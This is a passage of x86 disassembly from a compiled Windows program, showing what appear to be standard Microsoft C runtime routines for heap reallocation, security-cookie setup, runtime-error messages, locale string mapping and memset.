  42596b:	ja     0x4259b9
  42596d:	push   esi
  42596e:	push   edi
  42596f:	push   eax
  425970:	call   0x425232
  425975:	add    esp,0xc
  425978:	test   eax,eax
  42597a:	je     0x425981
  42597c:	mov    DWORD PTR [ebp-0x1c],edi
  42597f:	jmp    0x4259b9
  425981:	push   esi
  425982:	call   0x425511
  425987:	pop    ecx
  425988:	mov    DWORD PTR [ebp-0x1c],eax
  42598b:	cmp    eax,ebx
  42598d:	je     0x4259b9
  42598f:	mov    eax,DWORD PTR [edi-0x4]
  425992:	dec    eax
  425993:	mov    DWORD PTR [ebp-0x24],eax
  425996:	cmp    eax,esi
  425998:	jb     0x42599c
  42599a:	mov    eax,esi
  42599c:	push   eax
  42599d:	push   edi
  42599e:	push   DWORD PTR [ebp-0x1c]
  4259a1:	call   0x424690
  4259a6:	push   edi
  4259a7:	call   0x424d32
  4259ac:	mov    DWORD PTR [ebp-0x20],eax
  4259af:	push   edi
  4259b0:	push   eax
  4259b1:	call   0x424d5d
  4259b6:	add    esp,0x18
  4259b9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4259bc:	jne    0x425a09
  4259be:	cmp    esi,ebx
  4259c0:	jne    0x4259c8
  4259c2:	xor    esi,esi
  4259c4:	inc    esi
  4259c5:	mov    DWORD PTR [ebp+0xc],esi
  4259c8:	add    esi,0xf
  4259cb:	and    esi,0xfffffff0
  4259ce:	mov    DWORD PTR [ebp+0xc],esi
  4259d1:	push   esi
  4259d2:	push   ebx
  4259d3:	push   DWORD PTR ds:0x4653e0
  4259d9:	call   DWORD PTR ds:0x4280e4
  4259df:	mov    DWORD PTR [ebp-0x1c],eax
  4259e2:	cmp    eax,ebx
  4259e4:	je     0x425a09
  4259e6:	mov    eax,DWORD PTR [edi-0x4]
  4259e9:	dec    eax
  4259ea:	mov    DWORD PTR [ebp-0x24],eax
  4259ed:	cmp    eax,esi
  4259ef:	jb     0x4259f3
  4259f1:	mov    eax,esi
  4259f3:	push   eax
  4259f4:	push   edi
  4259f5:	push   DWORD PTR [ebp-0x1c]
  4259f8:	call   0x424690
  4259fd:	push   edi
  4259fe:	push   DWORD PTR [ebp-0x20]
  425a01:	call   0x424d5d
  425a06:	add    esp,0x14
  425a09:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a0d:	call   0x425a61
  425a12:	cmp    DWORD PTR [ebp-0x20],ebx
  425a15:	jne    0x425a39
  425a17:	cmp    esi,ebx
  425a19:	jne    0x425a1e
  425a1b:	xor    esi,esi
  425a1d:	inc    esi
  425a1e:	add    esi,0xf
  425a21:	and    esi,0xfffffff0
  425a24:	mov    DWORD PTR [ebp+0xc],esi
  425a27:	push   esi
  425a28:	push   edi
  425a29:	push   ebx
  425a2a:	push   DWORD PTR ds:0x4653e0
  425a30:	call   DWORD PTR ds:0x4280f0
  425a36:	mov    DWORD PTR [ebp-0x1c],eax
  425a39:	mov    eax,DWORD PTR [ebp-0x1c]
  425a3c:	cmp    eax,ebx
  425a3e:	jne    0x425aa0
  425a40:	cmp    DWORD PTR ds:0x465068,ebx
  425a46:	je     0x425aa0
  425a48:	push   esi
  425a49:	call   0x426232
  425a4e:	pop    ecx
  425a4f:	test   eax,eax
  425a51:	jne    0x42593c
  425a57:	jmp    0x425a9e
  425a59:	xor    ebx,ebx
  425a5b:	mov    esi,DWORD PTR [ebp+0xc]
  425a5e:	mov    edi,DWORD PTR [ebp+0x8]
  425a61:	push   0x4
  425a63:	call   0x423a7b
  425a68:	pop    ecx
  425a69:	ret    
  425a6a:	xor    eax,eax
  425a6c:	cmp    esi,0xffffffe0
  425a6f:	ja     0x425a87
  425a71:	cmp    esi,ebx
  425a73:	jne    0x425a78
  425a75:	xor    esi,esi
  425a77:	inc    esi
  425a78:	push   esi
  425a79:	push   edi
  425a7a:	push   ebx
  425a7b:	push   DWORD PTR ds:0x4653e0
  425a81:	call   DWORD PTR ds:0x4280f0
  425a87:	cmp    eax,ebx
  425a89:	jne    0x425aa0
  425a8b:	cmp    DWORD PTR ds:0x465068,ebx
  425a91:	je     0x425aa0
  425a93:	push   esi
  425a94:	call   0x426232
  425a99:	pop    ecx
  425a9a:	test   eax,eax
  425a9c:	jne    0x425a6a
  425a9e:	xor    eax,eax
  425aa0:	call   0x42398b
  425aa5:	ret    
  425aa6:	push   0x10
  425aa8:	push   0x4287d0
  425aad:	call   0x423950
  425ab2:	cmp    DWORD PTR ds:0x4653e4,0x3
  425ab9:	jne    0x425af5
  425abb:	push   0x4
  425abd:	call   0x423b0f
  425ac2:	pop    ecx
  425ac3:	and    DWORD PTR [ebp-0x4],0x0
  425ac7:	mov    esi,DWORD PTR [ebp+0x8]
  425aca:	push   esi
  425acb:	call   0x424d32
  425ad0:	pop    ecx
  425ad1:	mov    DWORD PTR [ebp-0x1c],eax
  425ad4:	test   eax,eax
  425ad6:	je     0x425ae3
  425ad8:	mov    esi,DWORD PTR [esi-0x4]
  425adb:	sub    esi,0x9
  425ade:	mov    DWORD PTR [ebp-0x20],esi
  425ae1:	jmp    0x425ae6
  425ae3:	mov    esi,DWORD PTR [ebp-0x20]
  425ae6:	or     DWORD PTR [ebp-0x4],0xffffffff
  425aea:	call   0x425b13
  425aef:	cmp    DWORD PTR [ebp-0x1c],0x0
  425af3:	jne    0x425b08
  425af5:	push   DWORD PTR [ebp+0x8]
  425af8:	push   0x0
  425afa:	push   DWORD PTR ds:0x4653e0
  425b00:	call   DWORD PTR ds:0x4280f4
  425b06:	mov    esi,eax
  425b08:	mov    eax,esi
  425b0a:	call   0x42398b
  425b0f:	ret    
  425b10:	mov    esi,DWORD PTR [ebp-0x20]
  425b13:	push   0x4
  425b15:	call   0x423a7b
  425b1a:	pop    ecx
  425b1b:	ret    
  425b1c:	push   ebp
  425b1d:	mov    ebp,esp
  425b1f:	sub    esp,0x10
  425b22:	push   esi
  425b23:	lea    eax,[ebp-0x8]
  425b26:	push   eax
  425b27:	call   DWORD PTR ds:0x428104
  425b2d:	mov    esi,DWORD PTR [ebp-0x4]
  425b30:	xor    esi,DWORD PTR [ebp-0x8]
  425b33:	call   DWORD PTR ds:0x428100
  425b39:	xor    esi,eax
  425b3b:	call   DWORD PTR ds:0x4280ac
  425b41:	xor    esi,eax
  425b43:	call   DWORD PTR ds:0x4280fc
  425b49:	xor    esi,eax
  425b4b:	lea    eax,[ebp-0x10]
  425b4e:	push   eax
  425b4f:	call   DWORD PTR ds:0x4280f8
  425b55:	mov    eax,DWORD PTR [ebp-0xc]
  425b58:	xor    eax,DWORD PTR [ebp-0x10]
  425b5b:	xor    esi,eax
  425b5d:	mov    DWORD PTR ds:0x4646c0,esi
  425b63:	jne    0x425b6f
  425b65:	mov    DWORD PTR ds:0x4646c0,0xbb40e64e
  425b6f:	pop    esi
  425b70:	leave  
  425b71:	ret    
  425b72:	push   0x118
  425b77:	push   0x428980
  425b7c:	call   0x423950
  425b81:	mov    eax,ds:0x4646c0
  425b86:	xor    eax,DWORD PTR [ebp+0x4]
  425b89:	mov    DWORD PTR [ebp-0x1c],eax
  425b8c:	mov    eax,ds:0x465038
  425b91:	xor    ecx,ecx
  425b93:	cmp    eax,ecx
  425b95:	je     0x425bb6
  425b97:	mov    DWORD PTR [ebp-0x4],ecx
  425b9a:	push   DWORD PTR [ebp+0xc]
  425b9d:	push   DWORD PTR [ebp+0x8]
  425ba0:	call   eax
  425ba2:	pop    ecx
  425ba3:	pop    ecx
  425ba4:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ba8:	jmp    0x425cb4
  425bad:	xor    eax,eax
  425baf:	inc    eax
  425bb0:	ret    
  425bb1:	mov    esp,DWORD PTR [ebp-0x18]
  425bb4:	jmp    0x425ba4
  425bb6:	mov    eax,DWORD PTR [ebp+0x8]
  425bb9:	dec    eax
  425bba:	je     0x425bcf
  425bbc:	mov    edi,0x42895c
  425bc1:	mov    DWORD PTR [ebp-0x20],0x4288a8
  425bc8:	mov    esi,0xd4
  425bcd:	jmp    0x425be0
  425bcf:	mov    edi,0x428888
  425bd4:	mov    DWORD PTR [ebp-0x20],0x4287e8
  425bdb:	mov    esi,0xb9
  425be0:	mov    BYTE PTR [ebp-0x24],cl
  425be3:	push   0x104
  425be8:	lea    eax,[ebp-0x128]
  425bee:	push   eax
  425bef:	push   ecx
  425bf0:	call   DWORD PTR ds:0x428080
  425bf6:	test   eax,eax
  425bf8:	jne    0x425c0d
  425bfa:	push   0x4284dc
  425bff:	lea    eax,[ebp-0x128]
  425c05:	push   eax
  425c06:	call   0x423d30
  425c0b:	pop    ecx
  425c0c:	pop    ecx
  425c0d:	lea    ebx,[ebp-0x128]
  425c13:	lea    eax,[ebp-0x128]
  425c19:	push   eax
  425c1a:	call   0x423f60
  425c1f:	pop    ecx
  425c20:	add    eax,0xb
  425c23:	cmp    eax,0x3c
  425c26:	jbe    0x425c51
  425c28:	lea    eax,[ebp-0x128]
  425c2e:	push   eax
  425c2f:	call   0x423f60
  425c34:	mov    ebx,eax
  425c36:	lea    eax,[ebp-0x128]
  425c3c:	sub    eax,0x31
  425c3f:	add    ebx,eax
  425c41:	push   0x3
  425c43:	push   0x4284d8
  425c48:	push   ebx
  425c49:	call   0x423e30
  425c4e:	add    esp,0x10
  425c51:	push   ebx
  425c52:	call   0x423f60
  425c57:	pop    ecx
  425c58:	lea    eax,[eax+esi*1+0xc]
  425c5c:	add    eax,0x3
  425c5f:	and    eax,0xfffffffc
  425c62:	call   0x4239a0
  425c67:	mov    DWORD PTR [ebp-0x18],esp
  425c6a:	mov    esi,esp
  425c6c:	push   edi
  425c6d:	push   esi
  425c6e:	call   0x423d30
  425c73:	mov    edi,0x4284b8
  425c78:	push   edi
  425c79:	push   esi
  425c7a:	call   0x423d40
  425c7f:	push   0x4287dc
  425c84:	push   esi
  425c85:	call   0x423d40
  425c8a:	push   ebx
  425c8b:	push   esi
  425c8c:	call   0x423d40
  425c91:	push   edi
  425c92:	push   esi
  425c93:	call   0x423d40
  425c98:	push   DWORD PTR [ebp-0x20]
  425c9b:	push   esi
  425c9c:	call   0x423d40
  425ca1:	push   0x12010
  425ca6:	push   0x428490
  425cab:	push   esi
  425cac:	call   0x423c32
  425cb1:	add    esp,0x3c
  425cb4:	push   0x3
  425cb6:	call   0x422dbc
  425cbb:	int3   
  425cbc:	push   0x38
  425cbe:	push   0x428da0
  425cc3:	call   0x423950
  425cc8:	xor    ebx,ebx
  425cca:	cmp    DWORD PTR ds:0x46505c,ebx
  425cd0:	jne    0x425d0a
  425cd2:	push   ebx
  425cd3:	push   ebx
  425cd4:	xor    esi,esi
  425cd6:	inc    esi
  425cd7:	push   esi
  425cd8:	push   0x428d9c
  425cdd:	push   0x100
  425ce2:	push   ebx
  425ce3:	call   DWORD PTR ds:0x428110
  425ce9:	test   eax,eax
  425ceb:	je     0x425cf5
  425ced:	mov    DWORD PTR ds:0x46505c,esi
  425cf3:	jmp    0x425d0a
  425cf5:	call   DWORD PTR ds:0x428034
  425cfb:	cmp    eax,0x78
  425cfe:	jne    0x425d0a
  425d00:	mov    DWORD PTR ds:0x46505c,0x2
  425d0a:	cmp    DWORD PTR [ebp+0x14],ebx
  425d0d:	jle    0x425d2a
  425d0f:	mov    ecx,DWORD PTR [ebp+0x14]
  425d12:	mov    eax,DWORD PTR [ebp+0x10]
  425d15:	dec    ecx
  425d16:	cmp    BYTE PTR [eax],bl
  425d18:	je     0x425d22
  425d1a:	inc    eax
  425d1b:	cmp    ecx,ebx
  425d1d:	jne    0x425d15
  425d1f:	or     ecx,0xffffffff
  425d22:	or     eax,0xffffffff
  425d25:	sub    eax,ecx
  425d27:	add    DWORD PTR [ebp+0x14],eax
  425d2a:	mov    eax,ds:0x46505c
  425d2f:	cmp    eax,0x2
  425d32:	je     0x425f14
  425d38:	cmp    eax,ebx
  425d3a:	je     0x425f14
  425d40:	cmp    eax,0x1
  425d43:	jne    0x425f47
  425d49:	xor    edi,edi
  425d4b:	mov    DWORD PTR [ebp-0x1c],edi
  425d4e:	mov    DWORD PTR [ebp-0x20],ebx
  425d51:	mov    DWORD PTR [ebp-0x24],ebx
  425d54:	cmp    DWORD PTR [ebp+0x20],ebx
  425d57:	jne    0x425d61
  425d59:	mov    eax,ds:0x465054
  425d5e:	mov    DWORD PTR [ebp+0x20],eax
  425d61:	push   ebx
  425d62:	push   ebx
  425d63:	push   DWORD PTR [ebp+0x14]
  425d66:	push   DWORD PTR [ebp+0x10]
  425d69:	xor    eax,eax
  425d6b:	cmp    DWORD PTR [ebp+0x24],ebx
  425d6e:	setne  al
  425d71:	lea    eax,[eax*8+0x1]
  425d78:	push   eax
  425d79:	push   DWORD PTR [ebp+0x20]
  425d7c:	call   DWORD PTR ds:0x42810c
  425d82:	mov    esi,eax
  425d84:	mov    DWORD PTR [ebp-0x28],esi
  425d87:	cmp    esi,ebx
  425d89:	je     0x425f47
  425d8f:	mov    DWORD PTR [ebp-0x4],0x1
  425d96:	lea    eax,[esi+esi*1]
  425d99:	add    eax,0x3
  425d9c:	and    eax,0xfffffffc
  425d9f:	call   0x4239a0
  425da4:	mov    DWORD PTR [ebp-0x18],esp
  425da7:	mov    eax,esp
  425da9:	mov    DWORD PTR [ebp-0x2c],eax
  425dac:	or     DWORD PTR [ebp-0x4],0xffffffff
  425db0:	jmp    0x425dcd
  425db2:	xor    eax,eax
  425db4:	inc    eax
  425db5:	ret    
  425db6:	mov    esp,DWORD PTR [ebp-0x18]
  425db9:	call   0x426de5
  425dbe:	xor    ebx,ebx
  425dc0:	mov    DWORD PTR [ebp-0x2c],ebx
  425dc3:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dc7:	mov    edi,DWORD PTR [ebp-0x1c]
  425dca:	mov    esi,DWORD PTR [ebp-0x28]
  425dcd:	cmp    DWORD PTR [ebp-0x2c],ebx
  425dd0:	jne    0x425dee
  425dd2:	lea    eax,[esi+esi*1]
  425dd5:	push   eax
  425dd6:	call   0x424672
  425ddb:	pop    ecx
  425ddc:	mov    DWORD PTR [ebp-0x2c],eax
  425ddf:	cmp    eax,ebx
  425de1:	je     0x425f47
  425de7:	mov    DWORD PTR [ebp-0x20],0x1
  425dee:	push   esi
  425def:	push   DWORD PTR [ebp-0x2c]
  425df2:	push   DWORD PTR [ebp+0x14]
  425df5:	push   DWORD PTR [ebp+0x10]
  425df8:	push   0x1
  425dfa:	push   DWORD PTR [ebp+0x20]
  425dfd:	call   DWORD PTR ds:0x42810c
  425e03:	test   eax,eax
  425e05:	je     0x425ef1
  425e0b:	push   ebx
  425e0c:	push   ebx
  425e0d:	push   esi
  425e0e:	push   DWORD PTR [ebp-0x2c]
  425e11:	push   DWORD PTR [ebp+0xc]
  425e14:	push   DWORD PTR [ebp+0x8]
  425e17:	call   DWORD PTR ds:0x428110
  425e1d:	mov    edi,eax
  425e1f:	mov    DWORD PTR [ebp-0x1c],edi
  425e22:	cmp    edi,ebx
  425e24:	je     0x425ef1
  425e2a:	test   BYTE PTR [ebp+0xd],0x4
  425e2e:	je     0x425e5d
  425e30:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e33:	je     0x425ef1
  425e39:	cmp    edi,DWORD PTR [ebp+0x1c]
  425e3c:	jg     0x425ef1
  425e42:	push   DWORD PTR [ebp+0x1c]
  425e45:	push   DWORD PTR [ebp+0x18]
  425e48:	push   esi
  425e49:	push   DWORD PTR [ebp-0x2c]
  425e4c:	push   DWORD PTR [ebp+0xc]
  425e4f:	push   DWORD PTR [ebp+0x8]
  425e52:	call   DWORD PTR ds:0x428110
  425e58:	jmp    0x425ef1
  425e5d:	mov    DWORD PTR [ebp-0x4],0x2
  425e64:	lea    eax,[edi+edi*1]
  425e67:	add    eax,0x3
  425e6a:	and    eax,0xfffffffc
  425e6d:	call   0x4239a0
  425e72:	mov    DWORD PTR [ebp-0x18],esp
  425e75:	mov    eax,esp
  425e77:	mov    DWORD PTR [ebp-0x30],eax
  425e7a:	or     DWORD PTR [ebp-0x4],0xffffffff
  425e7e:	jmp    0x425e9b
  425e80:	xor    eax,eax
  425e82:	inc    eax
  425e83:	ret    
  425e84:	mov    esp,DWORD PTR [ebp-0x18]
  425e87:	call   0x426de5
  425e8c:	xor    ebx,ebx
  425e8e:	mov    DWORD PTR [ebp-0x30],ebx
  425e91:	or     DWORD PTR [ebp-0x4],0xffffffff
  425e95:	mov    edi,DWORD PTR [ebp-0x1c]
  425e98:	mov    esi,DWORD PTR [ebp-0x28]
  425e9b:	cmp    DWORD PTR [ebp-0x30],ebx
  425e9e:	jne    0x425eb8
  425ea0:	lea    eax,[edi+edi*1]
  425ea3:	push   eax
  425ea4:	call   0x424672
  425ea9:	pop    ecx
  425eaa:	mov    DWORD PTR [ebp-0x30],eax
  425ead:	cmp    eax,ebx
  425eaf:	je     0x425ef1
  425eb1:	mov    DWORD PTR [ebp-0x24],0x1
  425eb8:	push   edi
  425eb9:	push   DWORD PTR [ebp-0x30]
  425ebc:	push   esi
  425ebd:	push   DWORD PTR [ebp-0x2c]
  425ec0:	push   DWORD PTR [ebp+0xc]
  425ec3:	push   DWORD PTR [ebp+0x8]
  425ec6:	call   DWORD PTR ds:0x428110
  425ecc:	test   eax,eax
  425ece:	je     0x425ef1
  425ed0:	push   ebx
  425ed1:	push   ebx
  425ed2:	cmp    DWORD PTR [ebp+0x1c],ebx
  425ed5:	jne    0x425edb
  425ed7:	push   ebx
  425ed8:	push   ebx
  425ed9:	jmp    0x425ee1
  425edb:	push   DWORD PTR [ebp+0x1c]
  425ede:	push   DWORD PTR [ebp+0x18]
  425ee1:	push   edi
  425ee2:	push   DWORD PTR [ebp-0x30]
  425ee5:	push   ebx
  425ee6:	push   DWORD PTR [ebp+0x20]
  425ee9:	call   DWORD PTR ds:0x428090
  425eef:	mov    edi,eax
  425ef1:	cmp    DWORD PTR [ebp-0x24],ebx
  425ef4:	je     0x425eff
  425ef6:	push   DWORD PTR [ebp-0x30]
  425ef9:	call   0x42455a
  425efe:	pop    ecx
  425eff:	cmp    DWORD PTR [ebp-0x20],ebx
  425f02:	je     0x425f0d
  425f04:	push   DWORD PTR [ebp-0x2c]
  425f07:	call   0x42455a
  425f0c:	pop    ecx
  425f0d:	mov    eax,edi
  425f0f:	jmp    0x42606f
  425f14:	mov    DWORD PTR [ebp-0x34],ebx
  425f17:	xor    edi,edi
  425f19:	mov    DWORD PTR [ebp-0x38],ebx
  425f1c:	cmp    DWORD PTR [ebp+0x8],ebx
  425f1f:	jne    0x425f29
  425f21:	mov    eax,ds:0x465044
  425f26:	mov    DWORD PTR [ebp+0x8],eax
  425f29:	cmp    DWORD PTR [ebp+0x20],ebx
  425f2c:	jne    0x425f36
  425f2e:	mov    eax,ds:0x465054
  425f33:	mov    DWORD PTR [ebp+0x20],eax
  425f36:	push   DWORD PTR [ebp+0x8]
  425f39:	call   0x426bcd
  425f3e:	pop    ecx
  425f3f:	mov    DWORD PTR [ebp-0x3c],eax
  425f42:	cmp    eax,0xffffffff
  425f45:	jne    0x425f4e
  425f47:	xor    eax,eax
  425f49:	jmp    0x42606f
  425f4e:	cmp    eax,DWORD PTR [ebp+0x20]
  425f51:	je     0x426045
  425f57:	push   ebx
  425f58:	push   ebx
  425f59:	lea    ecx,[ebp+0x14]
  425f5c:	push   ecx
  425f5d:	push   DWORD PTR [ebp+0x10]
  425f60:	push   eax
  425f61:	push   DWORD PTR [ebp+0x20]
  425f64:	call   0x426c16
  425f69:	add    esp,0x18
  425f6c:	mov    DWORD PTR [ebp-0x34],eax
  425f6f:	cmp    eax,ebx
  425f71:	je     0x425f47
  425f73:	push   ebx
  425f74:	push   ebx
  425f75:	push   DWORD PTR [ebp+0x14]
  425f78:	push   eax
  425f79:	push   DWORD PTR [ebp+0xc]
  425f7c:	push   DWORD PTR [ebp+0x8]
  425f7f:	call   DWORD PTR ds:0x428108
  425f85:	mov    esi,eax
  425f87:	mov    DWORD PTR [ebp-0x40],esi
  425f8a:	cmp    esi,ebx
  425f8c:	je     0x426034
  425f92:	mov    DWORD PTR [ebp-0x4],ebx
  425f95:	add    eax,0x3
  425f98:	and    eax,0xfffffffc
  425f9b:	call   0x4239a0
  425fa0:	mov    DWORD PTR [ebp-0x18],esp
  425fa3:	mov    edi,esp
  425fa5:	mov    DWORD PTR [ebp-0x44],edi
  425fa8:	push   esi
  425fa9:	push   ebx
  425faa:	push   edi
  425fab:	call   0x426250
  425fb0:	add    esp,0xc
  425fb3:	jmp    0x425fc5
  425fb5:	xor    eax,eax
  425fb7:	inc    eax
  425fb8:	ret    
  425fb9:	mov    esp,DWORD PTR [ebp-0x18]
  425fbc:	call   0x426de5
  425fc1:	xor    ebx,ebx
  425fc3:	xor    edi,edi
  425fc5:	or     DWORD PTR [ebp-0x4],0xffffffff
  425fc9:	cmp    edi,ebx
  425fcb:	jne    0x425ff0
  425fcd:	push   DWORD PTR [ebp-0x40]
  425fd0:	call   0x424672
  425fd5:	pop    ecx
  425fd6:	mov    edi,eax
  425fd8:	cmp    edi,ebx
  425fda:	je     0x42600d
  425fdc:	push   DWORD PTR [ebp-0x40]
  425fdf:	push   ebx
  425fe0:	push   edi
  425fe1:	call   0x426250
  425fe6:	add    esp,0xc
  425fe9:	mov    DWORD PTR [ebp-0x38],0x1
  425ff0:	push   DWORD PTR [ebp-0x40]
  425ff3:	push   edi
  425ff4:	push   DWORD PTR [ebp+0x14]
  425ff7:	push   DWORD PTR [ebp-0x34]
  425ffa:	push   DWORD PTR [ebp+0xc]
  425ffd:	push   DWORD PTR [ebp+0x8]
  426000:	call   DWORD PTR ds:0x428108
  426006:	mov    DWORD PTR [ebp-0x40],eax
  426009:	cmp    eax,ebx
  42600b:	jne    0x426011
  42600d:	xor    esi,esi
  42600f:	jmp    0x426037
  426011:	push   DWORD PTR [ebp+0x1c]
  426014:	push   DWORD PTR [ebp+0x18]
  426017:	lea    eax,[ebp-0x40]
  42601a:	push   eax
  42601b:	push   edi
  42601c:	push   DWORD PTR [ebp+0x20]
  42601f:	push   DWORD PTR [ebp-0x3c]
  426022:	call   0x426c16
  426027:	add    esp,0x18
  42602a:	mov    esi,eax
  42602c:	neg    esi
  42602e:	sbb    esi,esi
  426030:	neg    esi
  426032:	jmp    0x426037
  426034:	mov    esi,DWORD PTR [ebp-0x48]
  426037:	cmp    DWORD PTR [ebp-0x38],ebx
  42603a:	je     0x42605f
  42603c:	push   edi
  42603d:	call   0x42455a
  426042:	pop    ecx
  426043:	jmp    0x42605f
  426045:	push   DWORD PTR [ebp+0x1c]
  426048:	push   DWORD PTR [ebp+0x18]
  42604b:	push   DWORD PTR [ebp+0x14]
  42604e:	push   DWORD PTR [ebp+0x10]
  426051:	push   DWORD PTR [ebp+0xc]
  426054:	push   DWORD PTR [ebp+0x8]
  426057:	call   DWORD PTR ds:0x428108
  42605d:	mov    esi,eax
  42605f:	cmp    DWORD PTR [ebp-0x34],ebx
  426062:	je     0x42606d
  426064:	push   DWORD PTR [ebp-0x34]
  426067:	call   0x42455a
  42606c:	pop    ecx
  42606d:	mov    eax,esi
  42606f:	lea    esp,[ebp-0x54]
  426072:	call   0x42398b
  426077:	ret    
  426078:	push   0x1c
  42607a:	push   0x428dc8
  42607f:	call   0x423950
  426084:	xor    esi,esi
  426086:	cmp    DWORD PTR ds:0x465060,esi
  42608c:	jne    0x4260c3
  42608e:	lea    eax,[ebp-0x1c]
  426091:	push   eax
  426092:	xor    edi,edi
  426094:	inc    edi
  426095:	push   edi
  426096:	push   0x428d9c
  42609b:	push   edi
  42609c:	call   DWORD PTR ds:0x428118
  4260a2:	test   eax,eax
  4260a4:	je     0x4260ae
  4260a6:	mov    DWORD PTR ds:0x465060,edi
  4260ac:	jmp    0x4260c3
  4260ae:	call   DWORD PTR ds:0x428034
  4260b4:	cmp    eax,0x78
  4260b7:	jne    0x4260c3
  4260b9:	mov    DWORD PTR ds:0x465060,0x2
  4260c3:	mov    eax,ds:0x465060
  4260c8:	cmp    eax,0x2
  4260cb:	je     0x4261bb
  4260d1:	cmp    eax,esi
  4260d3:	je     0x4261bb
  4260d9:	cmp    eax,0x1
  4260dc:	jne    0x4261e1
  4260e2:	mov    DWORD PTR [ebp-0x20],esi
  4260e5:	mov    DWORD PTR [ebp-0x24],esi
  4260e8:	cmp    DWORD PTR [ebp+0x18],esi
  4260eb:	jne    0x4260f5
  4260ed:	mov    eax,ds:0x465054
  4260f2:	mov    DWORD PTR [ebp+0x18],eax
  4260f5:	push   esi
  4260f6:	push   esi
  4260f7:	push   DWORD PTR [ebp+0x10]
  4260fa:	push   DWORD PTR [ebp+0xc]
  4260fd:	xor    eax,eax
  4260ff:	cmp    DWORD PTR [ebp+0x20],esi
  426102:	setne  al
  426105:	lea    eax,[eax*8+0x1]
  42610c:	push   eax
  42610d:	push   DWORD PTR [ebp+0x18]
  426110:	call   DWORD PTR ds:0x42810c
  426116:	mov    edi,eax
  426118:	mov    DWORD PTR [ebp-0x28],edi
  42611b:	test   edi,edi
  42611d:	je     0x4261e1
  426123:	and    DWORD PTR [ebp-0x4],0x0
  426127:	lea    ebx,[edi+edi*1]
  42612a:	mov    eax,ebx
  42612c:	add    eax,0x3
  42612f:	and    eax,0xfffffffc
  426132:	call   0x4239a0
  426137:	mov    DWORD PTR [ebp-0x18],esp
  42613a:	mov    esi,esp
  42613c:	mov    DWORD PTR [ebp-0x2c],esi
  42613f:	push   ebx
  426140:	push   0x0
  426142:	push   esi
  426143:	call   0x426250
  426148:	add    esp,0xc
  42614b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42614f:	jmp    0x426166
  426151:	xor    eax,eax
  426153:	inc    eax
  426154:	ret    
  426155:	mov    esp,DWORD PTR [ebp-0x18]
  426158:	call   0x426de5
  42615d:	xor    esi,esi
  42615f:	or     DWORD PTR [ebp-0x4],0xffffffff
  426163:	mov    edi,DWORD PTR [ebp-0x28]
  426166:	test   esi,esi
  426168:	jne    0x426181
  42616a:	push   edi
  42616b:	push   0x2
  42616d:	call   0x424a68
  426172:	pop    ecx
  426173:	pop    ecx
  426174:	mov    esi,eax
  426176:	test   esi,esi
  426178:	je     0x4261e1
  42617a:	mov    DWORD PTR [ebp-0x24],0x1
  426181:	push   edi
  426182:	push   esi
  426183:	push   DWORD PTR [ebp+0x10]
  426186:	push   DWORD PTR [ebp+0xc]
  426189:	push   0x1
  42618b:	push   DWORD PTR [ebp+0x18]
  42618e:	call   DWORD PTR ds:0x42810c
  426194:	test   eax,eax
  426196:	je     0x4261a9
  426198:	push   DWORD PTR [ebp+0x14]
  42619b:	push   eax
  42619c:	push   esi
  42619d:	push   DWORD PTR [ebp+0x8]
  4261a0:	call   DWORD PTR ds:0x428118
  4261a6:	mov    DWORD PTR [ebp-0x20],eax
  4261a9:	cmp    DWORD PTR [ebp-0x24],0x0
  4261ad:	je     0x4261b6
  4261af:	push   esi
  4261b0:	call   0x42455a
  4261b5:	pop    ecx
  4261b6:	mov    eax,DWORD PTR [ebp-0x20]
  4261b9:	jmp    0x426229
  4261bb:	mov    ebx,DWORD PTR [ebp+0x1c]
  4261be:	cmp    ebx,esi
  4261c0:	jne    0x4261c8
  4261c2:	mov    ebx,DWORD PTR ds:0x465044
  4261c8:	mov    edi,DWORD PTR [ebp+0x18]
  4261cb:	test   edi,edi
  4261cd:	jne    0x4261d5
  4261cf:	mov    edi,DWORD PTR ds:0x465054
  4261d5:	push   ebx
  4261d6:	call   0x426bcd
  4261db:	pop    ecx
  4261dc:	cmp    eax,0xffffffff
  4261df:	jne    0x4261e5
  4261e1:	xor    eax,eax
  4261e3:	jmp    0x426229
  4261e5:	cmp    eax,edi
  4261e7:	je     0x426207
  4261e9:	push   0x0
  4261eb:	push   0x0
  4261ed:	lea    ecx,[ebp+0x10]
  4261f0:	push   ecx
  4261f1:	push   DWORD PTR [ebp+0xc]
  4261f4:	push   eax
  4261f5:	push   edi
  4261f6:	call   0x426c16
  4261fb:	add    esp,0x18
  4261fe:	mov    esi,eax
  426200:	test   esi,esi
  426202:	je     0x4261e1
  426204:	mov    DWORD PTR [ebp+0xc],esi
  426207:	push   DWORD PTR [ebp+0x14]
  42620a:	push   DWORD PTR [ebp+0x10]
  42620d:	push   DWORD PTR [ebp+0xc]
  426210:	push   DWORD PTR [ebp+0x8]
  426213:	push   ebx
  426214:	call   DWORD PTR ds:0x428114
  42621a:	mov    edi,eax
  42621c:	test   esi,esi
  42621e:	je     0x426227
  426220:	push   esi
  426221:	call   0x42455a
  426226:	pop    ecx
  426227:	mov    eax,edi
  426229:	lea    esp,[ebp-0x38]
  42622c:	call   0x42398b
  426231:	ret    
  426232:	mov    eax,ds:0x465064
  426237:	test   eax,eax
  426239:	je     0x42624a
  42623b:	push   DWORD PTR [esp+0x4]
  42623f:	call   eax
  426241:	test   eax,eax
  426243:	pop    ecx
  426244:	je     0x42624a
  426246:	xor    eax,eax
  426248:	inc    eax
  426249:	ret    
  42624a:	xor    eax,eax
  42624c:	ret    
  42624d:	int3   
  42624e:	int3   
  42624f:	int3   
  426250:	mov    edx,DWORD PTR [esp+0xc]
  426254:	mov    ecx,DWORD PTR [esp+0x4]
  426258:	test   edx,edx
  42625a:	je     0x4262ab
  42625c:	xor    eax,eax
  42625e:	mov    al,BYTE PTR [esp+0x8]
  426262:	push   edi
  426263:	mov    edi,ecx
  426265:	cmp    edx,0x4
  426268:	jb     0x42629b
  42626a:	neg    ecx
  42626c:	and    ecx,0x3
  42626f:	je     0x42627d
  426271:	sub    edx,ecx
  426273:	mov    BYTE PTR [edi],al
  426275:	add    edi,0x1
  426278:	sub    ecx,0x1
  42627b:	jne    0x426273
  42627d:	mov    ecx,eax
  42627f:	shl    eax,0x8
  426282:	add    eax,ecx
  426284:	mov    ecx,eax
  426286:	shl    eax,0x10
  426289:	add    eax,ecx
